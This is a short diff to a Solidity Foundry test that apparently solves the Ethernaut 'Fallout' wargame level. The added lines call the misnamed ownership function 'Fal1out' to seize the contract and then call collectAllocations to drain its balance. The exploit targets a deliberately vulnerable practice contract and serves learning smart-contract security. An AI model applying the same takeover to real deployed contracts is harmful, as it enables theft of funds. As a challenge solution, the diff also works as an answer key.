@@ -17,5 +17,10 @@ contract FalloutLevel is SetUpLevelTest {
         fallout = Fallout(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        fallout.Fal1out{value: 0.01 ether}();
+        fallout.collectAllocations();
+        assert(address(fallout).balance == 0);
+        vm.stopPrank();
     }
 }
